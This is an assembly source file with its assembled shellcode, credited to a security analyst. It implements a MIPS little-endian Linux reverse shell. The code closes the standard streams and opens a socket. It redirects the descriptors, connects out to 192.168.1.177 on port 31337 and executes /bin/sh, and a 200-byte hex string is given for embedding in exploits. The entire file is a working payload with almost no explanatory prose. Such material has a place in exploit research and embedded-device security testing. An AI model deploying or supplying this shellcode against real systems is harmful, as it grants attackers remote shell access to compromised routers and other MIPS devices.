# MIPS Little Endian Reverse Shell ASM File and Assembled Shellcode
# Written by Jacob Holcomb, Security Analyst @ Independent Security Evaluators
# Blog: http://infosec42.blogspot.com
# Company Website: http://securityevaluators.com


    .data

    .bss

    .text

    .globl _start

_start:

    #Close stdin(0)
    slti $a0, $zero, 0xFFFF
    li $v0, 4006
    syscall 0x42424

    #Close stdout(1)
    slti $a0, $zero, 0x1111
    li $v0, 4006
    syscall 0x42424

    #Close stderr(2)
    li $t4, 0xFFFFFFFD #-3
    not $a0, $t4
    li $v0, 4006
    syscall 0x42424

    #Socket Domain - AF_INET (2)
    li $t4, 0xFFFFFFFD #-3
    not $a0, $t4
    #Socket Type - SOCK_STREAM (2 for mips)
    not $a1, $t4
    #Socket Protocol - 0
    slti $a2, $zero, 0xFFFF
    #Call socket
    li $v0, 4183
    syscall 0x42424

    #Move socket return value (v0) to register a0
    #V0 must be below 0xFFFF/65535
    andi $a0, $v0, 0xFFFF

    #Calling dup three times
    #Duplicate FD (stdin)
    #Socket returned fd 0 - stdin goes to socket
    #-----
    #Duplicate FD (stdout)
    li $v0, 4041
    syscall 0x42424
    #Duplicate FD (stderr)
    li $v0, 4041
    syscall 0x42424

    #Connect sockfd
    #Socket FD is already in a0
    #-----
    #Connect sockaddr
    lui $a1, 0x6979 #Port:
    ori $a1, 0xFF01 #31337
    addi $a1, $a1, 0x0101
    sw $a1, -8($sp)

    li $a1, 0xB101A8C0 #192.168.1.177
    sw $a1, -4($sp)
    addi $a1, $sp, -8

    #Connect addrlen - 16
    li $t4, 0xFFFFFFEF #-17
    not $a2, $t4
    #Call connect
    li $v0, 4170
    syscall 0x42424

    #Putting /bin/sh onto the stack
    lui $t0, 0x6962 #Loading Upper Immediate - ib
    ori $t0, $t0,0x2f2f #Bitwise OR Immediate - //
    sw $t0, -20($sp) #Store word pointer to command string for execution
    #
    lui $t0, 0x6873 #Loading Upper Immediate - hs
    ori $t0, 0x2f6e #Bitwise OR Immediate - /n
    sw $t0, -16($sp) #Store word pointer to command string for execution
    #
    slti $a3, $zero, 0xFFFF #Putting null (0) onto stack
    sw $a3, -12($sp)
    sw $a3, -4($sp)

    #execve *filename
    addi $a0, $sp, -20
    #execve *argv[]
    addi $t0, $sp, -20
    sw $t0, -8($sp)
    addi $a1, $sp, -8
    #
    addiu $sp, $sp, -20 #Adjusting stack
    #
    #execve envp[] - 0
    slti $a2, $zero, 0xFFFF
    #Call execve
    li $v0, 4011
    syscall 0x42424



# NOTE: Assembled shellcode

    #200 byte Linux MIPS reverse shell shellcode by Jacob Holcomb of ISE
    #Connects on 192.168.1.177:31337
    stg3_SC = "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
    stg3_SC += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
    stg3_SC += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
    stg3_SC += "\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
    stg3_SC += "\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
    stg3_SC += "\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
    stg3_SC += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"
    stg3_SC += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
    stg3_SC += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
    stg3_SC += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
    stg3_SC += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
    stg3_SC += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
    stg3_SC += "\xab\x0f\x02\x24\x0c\x09\x09\x01"